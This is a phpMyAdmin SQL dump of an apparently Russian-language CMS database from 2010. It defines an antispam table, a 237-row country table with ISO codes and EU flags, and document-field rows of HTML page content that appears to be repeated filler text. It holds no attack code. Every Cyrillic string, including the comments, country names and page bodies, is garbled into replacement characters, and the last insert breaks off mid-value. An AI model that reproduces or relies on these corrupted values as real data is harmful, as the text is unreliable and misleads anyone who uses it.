-- phpMyAdmin SQL Dump
-- version 2.6.1
-- http://www.phpmyadmin.net
-- 
-- ����: localhost
-- ����� ��������: ��� 09 2010 �., 00:43
-- ������ �������: 5.0.45
-- ������ PHP: 5.2.4
-- 
-- ��: `ave209e`
-- 

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_antispam`
-- 

CREATE TABLE `cp_antispam` (
  `Id` bigint(15) unsigned NOT NULL auto_increment,
  `Code` char(10) NOT NULL,
  `Ctime` int(10) unsigned NOT NULL default '0',
  PRIMARY KEY  (`Id`),
  UNIQUE KEY `Code` (`Code`),
  KEY `Ctime` (`Ctime`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_antispam`
-- 


-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_countries`
-- 

CREATE TABLE `cp_countries` (
  `Id` mediumint(5) unsigned NOT NULL auto_increment,
  `country_code` char(2) NOT NULL default 'RU',
  `country_name` char(50) NOT NULL,
  `country_status` enum('1','2') NOT NULL default '2',
  `country_eu` enum('1','2') NOT NULL default '2',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=238 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_countries`
-- 

INSERT INTO `cp_countries` VALUES (1, 'AF', '����������', '2', '2');
INSERT INTO `cp_countries` VALUES (2, 'AL', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (3, 'DZ', '�����', '2', '2');
INSERT INTO `cp_countries` VALUES (4, 'AS', '������������ �����', '2', '2');
INSERT INTO `cp_countries` VALUES (5, 'AD', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (6, 'AO', '������', '2', '2');
INSERT INTO `cp_countries` VALUES (7, 'AI', '��������', '2', '2');
INSERT INTO `cp_countries` VALUES (8, 'AQ', '����������', '2', '2');
INSERT INTO `cp_countries` VALUES (9, 'AG', '������� � �������', '2', '2');
INSERT INTO `cp_countries` VALUES (10, 'AR', '���������', '2', '2');
INSERT INTO `cp_countries` VALUES (11, 'AM', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (12, 'AW', '�����', '2', '2');
INSERT INTO `cp_countries` VALUES (13, 'AU', '���������', '2', '2');
INSERT INTO `cp_countries` VALUES (14, 'AT', '�������', '2', '1');
INSERT INTO `cp_countries` VALUES (15, 'AZ', '�����������', '2', '2');
INSERT INTO `cp_countries` VALUES (16, 'BS', '����������� ��������� ��������', '2', '2');
INSERT INTO `cp_countries` VALUES (17, 'BH', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (18, 'BD', '���������', '2', '2');
INSERT INTO `cp_countries` VALUES (19, 'BB', '��������', '2', '2');
INSERT INTO `cp_countries` VALUES (20, 'BY', '����������', '1', '2');
INSERT INTO `cp_countries` VALUES (21, 'BE', '�������', '2', '1');
INSERT INTO `cp_countries` VALUES (22, 'BZ', '�����', '2', '2');
INSERT INTO `cp_countries` VALUES (23, 'BJ', '�����', '2', '2');
INSERT INTO `cp_countries` VALUES (24, 'BM', '���������� �������', '2', '2');
INSERT INTO `cp_countries` VALUES (25, 'BT', '�����', '2', '2');
INSERT INTO `cp_countries` VALUES (26, 'BO', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (27, 'BA', '������ � �����������', '2', '1');
INSERT INTO `cp_countries` VALUES (28, 'BW', '��������', '2', '2');
INSERT INTO `cp_countries` VALUES (29, 'BV', '������ �����', '2', '2');
INSERT INTO `cp_countries` VALUES (30, 'BR', '��������', '2', '2');
INSERT INTO `cp_countries` VALUES (31, 'IO', '���������� ���������� � ��������� ������', '2', '2');
INSERT INTO `cp_countries` VALUES (32, 'VG', '���������� ������� (��������)', '2', '2');
INSERT INTO `cp_countries` VALUES (33, 'BN', '������ ����������', '2', '2');
INSERT INTO `cp_countries` VALUES (34, 'BG', '��������', '2', '2');
INSERT INTO `cp_countries` VALUES (35, 'BF', '�������-����', '2', '2');
INSERT INTO `cp_countries` VALUES (36, 'BI', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (37, 'KH', '��������', '2', '2');
INSERT INTO `cp_countries` VALUES (38, 'CM', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (39, 'CA', '������', '2', '2');
INSERT INTO `cp_countries` VALUES (40, 'CV', '����-����', '2', '2');
INSERT INTO `cp_countries` VALUES (41, 'KY', '���������� �������', '2', '2');
INSERT INTO `cp_countries` VALUES (42, 'CF', '����������� ����������� ����������', '2', '2');
INSERT INTO `cp_countries` VALUES (43, 'TD', '���', '2', '2');
INSERT INTO `cp_countries` VALUES (44, 'CL', '����', '2', '2');
INSERT INTO `cp_countries` VALUES (45, 'CN', '�����', '2', '2');
INSERT INTO `cp_countries` VALUES (46, 'CX', '�������������� �������', '2', '2');
INSERT INTO `cp_countries` VALUES (47, 'CC', '��������� �������', '2', '2');
INSERT INTO `cp_countries` VALUES (48, 'CO', '��������', '2', '2');
INSERT INTO `cp_countries` VALUES (49, 'KM', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (50, 'CG', '�����', '2', '2');
INSERT INTO `cp_countries` VALUES (51, 'CK', '������� ����', '2', '2');
INSERT INTO `cp_countries` VALUES (52, 'CR', '�����-����', '2', '2');
INSERT INTO `cp_countries` VALUES (53, 'CI', '���-� ����� (����� �������� �����)', '2', '2');
INSERT INTO `cp_countries` VALUES (54, 'HR', '��������', '2', '1');
INSERT INTO `cp_countries` VALUES (55, 'CU', '����', '2', '2');
INSERT INTO `cp_countries` VALUES (56, 'CY', '����', '2', '2');
INSERT INTO `cp_countries` VALUES (57, 'CZ', '������� ����������', '2', '1');
INSERT INTO `cp_countries` VALUES (58, 'DK', '�����', '2', '1');
INSERT INTO `cp_countries` VALUES (59, 'DJ', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (60, 'DM', '��������', '2', '2');
INSERT INTO `cp_countries` VALUES (61, 'DO', '������������� ����������', '2', '2');
INSERT INTO `cp_countries` VALUES (62, 'TP', '��������� �����', '2', '2');
INSERT INTO `cp_countries` VALUES (63, 'EC', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (64, 'EG', '������', '2', '2');
INSERT INTO `cp_countries` VALUES (65, 'SV', '���-���������', '2', '2');
INSERT INTO `cp_countries` VALUES (66, 'GQ', '�������������� ������', '2', '2');
INSERT INTO `cp_countries` VALUES (67, 'ER', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (68, 'EE', '�������', '2', '1');
INSERT INTO `cp_countries` VALUES (69, 'ET', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (70, 'FK', '������������ �������', '2', '2');
INSERT INTO `cp_countries` VALUES (71, 'FO', '������� ����', '2', '2');
INSERT INTO `cp_countries` VALUES (72, 'FJ', '�����', '2', '2');
INSERT INTO `cp_countries` VALUES (73, 'FI', '���������', '2', '2');
INSERT INTO `cp_countries` VALUES (74, 'FR', '�������', '2', '1');
INSERT INTO `cp_countries` VALUES (75, 'FX', '�������, �������', '2', '1');
INSERT INTO `cp_countries` VALUES (76, 'GF', '����������� ������', '2', '2');
INSERT INTO `cp_countries` VALUES (77, 'PF', '����������� ���������', '2', '2');
INSERT INTO `cp_countries` VALUES (78, 'TF', '����������� ����� ����������', '2', '2');
INSERT INTO `cp_countries` VALUES (79, 'GA', '�����', '2', '2');
INSERT INTO `cp_countries` VALUES (80, 'GM', '������', '2', '2');
INSERT INTO `cp_countries` VALUES (81, 'GE', '������', '2', '2');
INSERT INTO `cp_countries` VALUES (82, 'DE', '��������', '2', '1');
INSERT INTO `cp_countries` VALUES (83, 'GH', '����', '2', '2');
INSERT INTO `cp_countries` VALUES (84, 'GI', '���������', '2', '2');
INSERT INTO `cp_countries` VALUES (85, 'GR', '������', '2', '1');
INSERT INTO `cp_countries` VALUES (86, 'GL', '����������', '2', '2');
INSERT INTO `cp_countries` VALUES (87, 'GD', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (88, 'GP', '���������', '2', '2');
INSERT INTO `cp_countries` VALUES (89, 'GU', '����', '2', '2');
INSERT INTO `cp_countries` VALUES (90, 'GT', '���������', '2', '2');
INSERT INTO `cp_countries` VALUES (91, 'GN', '������', '2', '2');
INSERT INTO `cp_countries` VALUES (92, 'GW', '������-������', '2', '2');
INSERT INTO `cp_countries` VALUES (93, 'GY', '������', '2', '2');
INSERT INTO `cp_countries` VALUES (94, 'HT', '�����', '2', '2');
INSERT INTO `cp_countries` VALUES (95, 'HM', '������� ���� � ����������', '2', '2');
INSERT INTO `cp_countries` VALUES (96, 'HN', '��������', '2', '2');
INSERT INTO `cp_countries` VALUES (97, 'HK', '��������', '2', '2');
INSERT INTO `cp_countries` VALUES (98, 'HU', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (99, 'IS', '��������', '2', '2');
INSERT INTO `cp_countries` VALUES (100, 'IN', '�����', '2', '2');
INSERT INTO `cp_countries` VALUES (101, 'ID', '���������', '2', '2');
INSERT INTO `cp_countries` VALUES (102, 'IQ', '����', '2', '2');
INSERT INTO `cp_countries` VALUES (103, 'IE', '��������', '2', '1');
INSERT INTO `cp_countries` VALUES (104, 'IR', '����', '2', '2');
INSERT INTO `cp_countries` VALUES (105, 'IL', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (106, 'IT', '������', '2', '1');
INSERT INTO `cp_countries` VALUES (107, 'JM', '������', '2', '2');
INSERT INTO `cp_countries` VALUES (108, 'JP', '������', '2', '2');
INSERT INTO `cp_countries` VALUES (109, 'JO', '������', '2', '2');
INSERT INTO `cp_countries` VALUES (110, 'KZ', '���������', '2', '2');
INSERT INTO `cp_countries` VALUES (111, 'KE', '�����', '2', '2');
INSERT INTO `cp_countries` VALUES (112, 'KI', '��������', '2', '2');
INSERT INTO `cp_countries` VALUES (113, 'KP', '����', '2', '2');
INSERT INTO `cp_countries` VALUES (114, 'KR', '���������� �����', '2', '2');
INSERT INTO `cp_countries` VALUES (115, 'KW', '������', '2', '2');
INSERT INTO `cp_countries` VALUES (116, 'KG', '����������', '2', '2');
INSERT INTO `cp_countries` VALUES (117, 'LA', '�������� ���', '2', '2');
INSERT INTO `cp_countries` VALUES (118, 'LV', '������', '2', '2');
INSERT INTO `cp_countries` VALUES (119, 'LB', '�����', '2', '2');
INSERT INTO `cp_countries` VALUES (120, 'LS', '������', '2', '2');
INSERT INTO `cp_countries` VALUES (121, 'LR', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (122, 'LY', '��������� �������� ����������', '2', '2');
INSERT INTO `cp_countries` VALUES (123, 'LI', '�����������', '2', '1');
INSERT INTO `cp_countries` VALUES (124, 'LT', '�����', '2', '2');
INSERT INTO `cp_countries` VALUES (125, 'LU', '����������', '2', '1');
INSERT INTO `cp_countries` VALUES (126, 'MO', '�����', '2', '2');
INSERT INTO `cp_countries` VALUES (127, 'MK', '���������', '2', '1');
INSERT INTO `cp_countries` VALUES (128, 'MG', '����������', '2', '2');
INSERT INTO `cp_countries` VALUES (129, 'MW', '������', '2', '2');
INSERT INTO `cp_countries` VALUES (130, 'MY', '��������', '2', '2');
INSERT INTO `cp_countries` VALUES (131, 'MV', '��������', '2', '2');
INSERT INTO `cp_countries` VALUES (132, 'ML', '����', '2', '2');
INSERT INTO `cp_countries` VALUES (133, 'MT', '������', '2', '2');
INSERT INTO `cp_countries` VALUES (134, 'MH', '���������� �������', '2', '2');
INSERT INTO `cp_countries` VALUES (135, 'MQ', '���������', '2', '2');
INSERT INTO `cp_countries` VALUES (136, 'MR', '����������', '2', '2');
INSERT INTO `cp_countries` VALUES (137, 'MU', '��������', '2', '2');
INSERT INTO `cp_countries` VALUES (138, 'YT', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (139, 'MX', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (140, 'FM', '����������', '2', '2');
INSERT INTO `cp_countries` VALUES (141, 'MD', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (142, 'MC', '������', '2', '2');
INSERT INTO `cp_countries` VALUES (143, 'MN', '��������', '2', '2');
INSERT INTO `cp_countries` VALUES (144, 'MS', '����������', '2', '2');
INSERT INTO `cp_countries` VALUES (145, 'MA', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (146, 'MZ', '��������', '2', '2');
INSERT INTO `cp_countries` VALUES (147, 'MM', '������', '2', '2');
INSERT INTO `cp_countries` VALUES (148, 'NA', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (149, 'NR', '�����', '2', '2');
INSERT INTO `cp_countries` VALUES (150, 'NP', '�����', '2', '2');
INSERT INTO `cp_countries` VALUES (151, 'NL', '����������', '2', '1');
INSERT INTO `cp_countries` VALUES (152, 'AN', '���������� �������', '2', '2');
INSERT INTO `cp_countries` VALUES (153, 'NC', '����� ���������', '2', '2');
INSERT INTO `cp_countries` VALUES (154, 'NZ', '����� ��������', '2', '2');
INSERT INTO `cp_countries` VALUES (155, 'NI', '���������', '2', '2');
INSERT INTO `cp_countries` VALUES (156, 'NE', '�����', '2', '2');
INSERT INTO `cp_countries` VALUES (157, 'NG', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (158, 'NU', '���', '2', '2');
INSERT INTO `cp_countries` VALUES (159, 'NF', '������ �������', '2', '2');
INSERT INTO `cp_countries` VALUES (160, 'MP', '������ �������� ������', '2', '2');
INSERT INTO `cp_countries` VALUES (161, 'NO', '��������', '2', '1');
INSERT INTO `cp_countries` VALUES (162, 'OM', '����', '2', '2');
INSERT INTO `cp_countries` VALUES (163, 'PK', '��������', '2', '2');
INSERT INTO `cp_countries` VALUES (164, 'PW', '�����', '2', '2');
INSERT INTO `cp_countries` VALUES (165, 'PA', '������', '2', '2');
INSERT INTO `cp_countries` VALUES (166, 'PG', '�����-����� ������', '2', '2');
INSERT INTO `cp_countries` VALUES (167, 'PY', '��������', '2', '2');
INSERT INTO `cp_countries` VALUES (168, 'PE', '����', '2', '2');
INSERT INTO `cp_countries` VALUES (169, 'PH', '���������', '2', '2');
INSERT INTO `cp_countries` VALUES (170, 'PN', '������ ��������', '2', '2');
INSERT INTO `cp_countries` VALUES (171, 'PL', '������', '2', '1');
INSERT INTO `cp_countries` VALUES (172, 'PT', '����������', '2', '1');
INSERT INTO `cp_countries` VALUES (173, 'PR', '������-����', '2', '2');
INSERT INTO `cp_countries` VALUES (174, 'QA', '�����', '2', '2');
INSERT INTO `cp_countries` VALUES (175, 'RE', '������ �������������', '2', '2');
INSERT INTO `cp_countries` VALUES (176, 'RO', '�������', '2', '1');
INSERT INTO `cp_countries` VALUES (177, 'RU', '������', '1', '2');
INSERT INTO `cp_countries` VALUES (178, 'RW', '������', '2', '2');
INSERT INTO `cp_countries` VALUES (179, 'LC', '������ ������� ����', '2', '2');
INSERT INTO `cp_countries` VALUES (180, 'WS', '�����', '2', '2');
INSERT INTO `cp_countries` VALUES (181, 'SM', '���-������', '2', '1');
INSERT INTO `cp_countries` VALUES (182, 'ST', '���-���� � ��������', '2', '2');
INSERT INTO `cp_countries` VALUES (183, 'SA', '���������� ������', '2', '2');
INSERT INTO `cp_countries` VALUES (184, 'SN', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (185, 'SC', '����������� �������', '2', '2');
INSERT INTO `cp_countries` VALUES (186, 'SL', '������ �����', '2', '2');
INSERT INTO `cp_countries` VALUES (187, 'SG', '��������', '2', '2');
INSERT INTO `cp_countries` VALUES (188, 'SK', '��������� ����������', '2', '1');
INSERT INTO `cp_countries` VALUES (189, 'SI', '��������', '2', '1');
INSERT INTO `cp_countries` VALUES (190, 'SB', '���������� �������', '2', '2');
INSERT INTO `cp_countries` VALUES (191, 'SO', '������', '2', '2');
INSERT INTO `cp_countries` VALUES (192, 'ZA', '����� ������', '2', '2');
INSERT INTO `cp_countries` VALUES (193, 'ES', '�������', '2', '1');
INSERT INTO `cp_countries` VALUES (194, 'LK', '���-�����', '2', '2');
INSERT INTO `cp_countries` VALUES (195, 'SH', '������ ������ �����', '2', '2');
INSERT INTO `cp_countries` VALUES (196, 'KN', '����-���� � �����', '2', '2');
INSERT INTO `cp_countries` VALUES (197, 'PM', '������ ������� �����', '2', '2');
INSERT INTO `cp_countries` VALUES (198, 'VC', '����-������� � ���������', '2', '2');
INSERT INTO `cp_countries` VALUES (199, 'SD', '�����', '2', '2');
INSERT INTO `cp_countries` VALUES (200, 'SR', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (201, 'SJ', '������� �������� � ���-�����', '2', '2');
INSERT INTO `cp_countries` VALUES (202, 'SZ', '���������', '2', '2');
INSERT INTO `cp_countries` VALUES (203, 'SE', '������', '2', '1');
INSERT INTO `cp_countries` VALUES (204, 'CH', '���������', '2', '2');
INSERT INTO `cp_countries` VALUES (205, 'SY', '��������� �������� ����������', '2', '2');
INSERT INTO `cp_countries` VALUES (206, 'TW', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (207, 'TJ', '�����������', '2', '2');
INSERT INTO `cp_countries` VALUES (208, 'TZ', '��������', '2', '2');
INSERT INTO `cp_countries` VALUES (209, 'TH', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (210, 'TG', '����', '2', '2');
INSERT INTO `cp_countries` VALUES (211, 'TK', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (212, 'TO', '�����', '2', '2');
INSERT INTO `cp_countries` VALUES (213, 'TT', '�������� � ������', '2', '2');
INSERT INTO `cp_countries` VALUES (214, 'TN', '�����', '2', '2');
INSERT INTO `cp_countries` VALUES (215, 'TR', '������', '2', '1');
INSERT INTO `cp_countries` VALUES (216, 'TM', '������������', '2', '2');
INSERT INTO `cp_countries` VALUES (217, 'TC', '������� ����� � ������', '2', '2');
INSERT INTO `cp_countries` VALUES (218, 'TV', '������', '2', '2');
INSERT INTO `cp_countries` VALUES (219, 'UG', '������', '2', '2');
INSERT INTO `cp_countries` VALUES (220, 'UA', '�������', '1', '2');
INSERT INTO `cp_countries` VALUES (221, 'AE', '������������ �������� �������', '2', '2');
INSERT INTO `cp_countries` VALUES (222, 'GB', '��������������', '2', '1');
INSERT INTO `cp_countries` VALUES (223, 'US', '����������� ����� �������', '2', '2');
INSERT INTO `cp_countries` VALUES (224, 'VI', '���������� ������� (���)', '2', '2');
INSERT INTO `cp_countries` VALUES (225, 'UY', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (226, 'UZ', '����������', '2', '2');
INSERT INTO `cp_countries` VALUES (227, 'VU', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (228, 'VA', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (229, 'VE', '���������', '2', '2');
INSERT INTO `cp_countries` VALUES (230, 'VN', '�������', '2', '2');
INSERT INTO `cp_countries` VALUES (231, 'WF', '������� ����� � �������', '2', '2');
INSERT INTO `cp_countries` VALUES (232, 'EH', '�������� ������', '2', '2');
INSERT INTO `cp_countries` VALUES (233, 'YE', '�����', '2', '2');
INSERT INTO `cp_countries` VALUES (234, 'YU', '���������', '2', '2');
INSERT INTO `cp_countries` VALUES (235, 'ZR', '����', '2', '2');
INSERT INTO `cp_countries` VALUES (236, 'ZM', '������', '2', '2');
INSERT INTO `cp_countries` VALUES (237, 'ZW', '��������', '2', '2');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_document_fields`
-- 

CREATE TABLE `cp_document_fields` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `rubric_field_id` mediumint(5) unsigned NOT NULL default '0',
  `document_id` int(10) unsigned NOT NULL default '0',
  `field_value` longtext NOT NULL,
  `document_in_search` enum('1','0') NOT NULL default '1',
  PRIMARY KEY  (`Id`),
  KEY `document_id` (`document_id`),
  KEY `rubric_field_id` (`rubric_field_id`)
) ENGINE=MyISAM AUTO_INCREMENT=59 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- ���� ������ ������� `cp_document_fields`
-- 

INSERT INTO `cp_document_fields` VALUES (1, 1, 1, '<p>��������� ������� ������ �������!</p>\r\n<p>������ �� ������ ������ ��������� ���� �������� ����������� � ��������� �����. ��� �� ����� ��������, �� ������� ��� ��� ��������� ������� - ��������.</p>\r\n<p>���� �� �������������� � �������� ������������ �������, ������� �� ����� ������� �� &bdquo;�������� ��������&ldquo;, �����, ����� �� ������ ��������������, �������������� ������ ��������.</p>\r\n<p></p>\r\n<p>[mod_banner:1]</p>', '0');
INSERT INTO `cp_document_fields` VALUES (2, 2, 1, 'uploads/images/start.jpg', '0');
INSERT INTO `cp_document_fields` VALUES (3, 4, 1, '�����������!', '0');
INSERT INTO `cp_document_fields` VALUES (4, 1, 2, '��������, ����������� ���� �������� �� ������.', '0');
INSERT INTO `cp_document_fields` VALUES (5, 2, 2, '', '0');
INSERT INTO `cp_document_fields` VALUES (6, 4, 2, '������ 404', '0');
INSERT INTO `cp_document_fields` VALUES (7, 1, 3, '<p>������� ���� ���������� � ����� ��������, �����.</p>', '0');
INSERT INTO `cp_document_fields` VALUES (8, 2, 3, '', '0');
INSERT INTO `cp_document_fields` VALUES (9, 4, 3, '� ��������', '0');
INSERT INTO `cp_document_fields` VALUES (10, 1, 4, '<p>����������, ������� ����� ���� ������� ���������� ������.</p>\r\n<p><a href="index.php?id=9&amp;doc=primer-galerei">jhgyruytyu</a></p>', '1');
INSERT INTO `cp_document_fields` VALUES (11, 2, 4, '', '1');
INSERT INTO `cp_document_fields` VALUES (12, 4, 4, '���� ������� ���������� ������', '1');
INSERT INTO `cp_document_fields` VALUES (13, 1, 5, '<p>[mod_contact:1]</p>', '1');
INSERT INTO `cp_document_fields` VALUES (14, 2, 5, '', '1');
INSERT INTO `cp_document_fields` VALUES (15, 4, 5, '�������� �����', '1');
INSERT INTO `cp_document_fields` VALUES (16, 5, 6, '<p>��������, ��� ��������� ��������� �������� ��������� - ��� ��������� �������� ���������� ������� ����� ���������. � ������-�������� ��� ������ �����������, ����� ������� ��������� ���� �������� ������������� ��������� �����, ��� �� �����, ��� 4,5 ���� ��� ���������� ����� ������� �� ������ ����������� �� ��������. �p������������ ������ ���� �������� (������ ������� �������� ����� - 23 ����� 1 �. II �. = 24.06.-771). <a name="more"></a> ��������� ����� ���� ��������, ��� �� �����, ��� ����� ������� � ������ ����� 82-� ������� ������. ���������� ������ �� ������ ���������� �������������� � �������������� ���������� (������� ������� &mdash; ����): � = 0,4 + 0,3 &middot; 2n (�. �.), ��� ��� ��������. <br />\r\n�������� ������������� �� ��������� ���, ����� ���� ������ �������� � ������ ������� ���� ����� � ������ (��� ����� ����� � �������� ������� ������), ����������. ������� ���� ������ ������� ������� ����, �� �������� ����� � ���������� � ��������� ������� ������� ����� � �������� &quot;� ��������&quot; (De senectute). ������� ��������� ������������ ����� �����������, ������ �� ������ � ��� �������������. ������� ��������� ������������ ������� ����������� ��������� &ndash; � ����� �������� ������ ����� ������������ � ���������, ��� �� ��� ������ ������� �����������.</p>\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\n<p>���p���� ������ � ��p������, �������� �� ������� �����������, ����� ������� ����, ��������, ��� � ����� ������� 3,26 �������� ����. ���������� ������������� ������� ��������, ������ ����������� ��������� �������� ������ ����� ������ � �� �� �������, � ����� ��������� �������. ����������� ��������, � ������ �����������, ������������� ������� ���������, ����� �������, ��������� ���� ������ ������ ��������� � ������ ������. ����������� ����p�� ��������. ������� ����, �� ������ ������, �������� ����������� ������� ���� &ndash; ��� ������ ���������, ��� �������. � ������-�������� ��� ������ �����������, ����� ������� ���������� ����������� ������������� ������ &ndash; � ����� �������� ������ ����� ������������ � ���������, ��� �� ��� ������ ������� �����������.</p>\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\n<p>�������� ������������� �� ��������� ���, ����� ���� ������ �������� � ������ ������� ���� ����� � ������ (��� ����� ����� � �������� ������� ������), ����������. ������� ���� ������ ������� ������� ����, �� �������� ����� � ���������� � ��������� ������� ������� ����� � �������� &quot;� ��������&quot; (De senectute). ������� ��������� ������������ ����� �����������, ������ �� ������ � ��� �������������. ������� ��������� ������������ ������� ����������� ��������� &ndash; � ����� �������� ������ ����� ������������ � ���������, ��� �� ��� ������ ������� �����������.</p>\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\n<p>���p���� ������ � ��p������, �������� �� ������� �����������, ����� ������� ����, ��������, ��� � ����� ������� 3,26 �������� ����. ���������� ������������� ������� ��������, ������ ����������� ��������� �������� ������ ����� ������ � �� �� �������, � ����� ��������� �������. ����������� ��������, � ������ �����������, ������������� ������� ���������, ����� �������, ��������� ���� ������ ������ ��������� � ������ ������. ����������� ����p�� ��������. ������� ����, �� ������ ������, �������� ����������� ������� ���� &ndash; ��� ������ ���������, ��� �������. � ������-�������� ��� ������ �����������, ����� ������� ���������� ����������� ������������� ������ &ndash; � ����� �������� ������ ����� ������������ � ���������, ��� �� ��� ������ ������� �����������.</p>\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\n<p>�������� ������������� �� ��������� ���, ����� ���� ������ �������� � ������ ������� ���� ����� � ������ (��� ����� ����� � �������� ������� ������), ����������. ������� ���� ������ ������� ������� ����, �� �������� ����� � ���������� � ��������� ������� ������� ����� � �������� &quot;� ��������&quot; (De senectute). ������� ��������� ������������ ����� �����������, ������ �� ������ � ��� �������������. ������� ��������� ������������ ������� ����������� ��������� &ndash; � ����� �������� ������ ����� ������������ � ���������, ��� �� ��� ������ ������� �����������.</p>\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\n<p>���p���� ������ � ��p������, �������� �� ������� �����������, ����� ������� ����, ��������, ��� � ����� ������� 3,26 �������� ����. ���������� ������������� ������� ��������, ������ ����������� ��������� �������� ������ ����� ������ � �� �� �������, � ����� ��������� �������. ����������� ��������, � ������ �����������, ������������� ������� ���������, ����� �������, ��������� ���� ������ ������ ��������� � ������ ������. ����������� ����p�� ��������. ������� ����, �� ������ ������, �������� ����������� ������� ���� &ndash; ��� ������ ���������, ��� �������. � ������-�������� ��� ������ �����������, ����� ������� ���������� ����������� ������������� ������ &ndash; � ����� �������� ������ ����� ������������ � ���������, ��� �� ��� ������ ������� �����������.</p>\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\n<p>�������� ������������� �� ��������� ���, ����� ���� ������ �������� � ������ ������� ���� ����� � ������ (��� ����� ����� � �������� ������� ������), ����������. ������� ���� ������ ������� ������� ����, �� �������� ����� � ���������� � ��������� ������� ������� ����� � �������� &quot;� ��������&quot; (De senectute). ������� ��������� ������������ ����� �����������, ������ �� ������ � ��� �������������. ������� ��������� ������������ ������� ����������� ��������� &ndash; � ����� �������� ������ ����� ������������ � ���������, ��� �� ��� ������ ������� �����������.</p>\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\n<p>���p���� ������ � ��p������, �������� �� ������� �����������, ����� ������� ����, ��������, ��� � ����� ������� 3,26 �������� ����. ���������� ������������� ������� ��������, ������ ����������� ��������� �������� ������ ����� ������ � �� �� �������, � ����� ��������� �������. ����������� ��������, � ������ �����������, ������������� ������� ���������, ����� �������, ��������� ���� ������ ������ ��������� � ������ ������. ����������� ����p�� ��������. ������� ����, �� ������ ������, �������� ����������� ������� ���� &ndash; ��� ������ ���������, ��� �������. � ������-�������� ��� ������ �����������, ����� ������� ���������� ����������� ������������� ������ &ndash; � ����� �������� ������ ����� ������������ � ���������, ��� �� ��� ������ ������� �����������.</p>\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\n<p>�������� ������������� �� ��������� ���, ����� ���� ������ �������� � ������ ������� ���� ����� � ������ (��� ����� ����� � �������� ������� ������), ����������. ������� ���� ������ ������� ������� ����, �� �������� ����� � ���������� � ��������� ������� ������� ����� � �������� &quot;� ��������&quot; (De senectute). ������� ��������� ������������ ����� �����������, ������ �� ������ � ��� �������������. ������� ��������� ������������ ������� ����������� ��������� &ndash; � ����� �������� ������ ����� ������������ � ���������, ��� �� ��� ������ ������� �����������.</p>\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\n<p>���p���� ������ � ��p������, �������� �� ������� �����������, ����� ������� ����, ��������, ��� � ����� ������� 3,26 �������� ����. ���������� ������������� ������� ��������, ������ ����������� ��������� �������� ������ ����� ������ � �� �� �������, � ����� ��������� �������. ����������� ��������, � ������ �����������, ������������� ������� ���������, ����� �������, ��������� ���� ������ ������ ��������� � ������ ������. ����������� ����p�� ��������. ������� ����, �� ������ ������, �������� ����������� ������� ���� &ndash; ��� ������ ���������, ��� �������. � ������-�������� ��� ������ �����������, ����� ������� ���������� ����������� ������������� ������ &ndash; � ����� �������� ������ ����� ������������ � ���������, ��� �� ��� ������ ������� �����������.</p>\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\n<p>�������� ������������� �� ��������� ���, ����� ���� ������ �������� � ������ ������� ���� ����� � ������ (��� ����� ����� � �������� ������� ������), ����������. ������� ���� ������ ������� ������� ����, �� �������� ����� � ���������� � ��������� ������� ������� ����� � �������� &quot;� ��������&quot; (De senectute). ������� ��������� ������������ ����� �����������, ������ �� ������ � ��� �������������. ������� ��������� ������������ ������� ����������� ��������� &ndash; � ����� �������� ������ ����� ������������ � ���������, ��� �� ��� ������ ������� �����������.</p>\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\n<p>���p���� ������ � ��p������, �������� �� ������� �����������, ����� ������� ����, ��������, ��� � ����� ������� 3,26 �������� ����. ���������� ������������� ������� ��������, ������ ����������� ��������� �������� ������ ����� ������ � �� �� �������, � ����� ��������� �������. ����������� ��������, � ������ �����������, ������������� ������� ���������, ����� �������, ��������� ���� ������ ������ ��������� � ������ ������. ����������� ����p�� ��������. ������� ����, �� ������ ������, �������� ����������� ������� 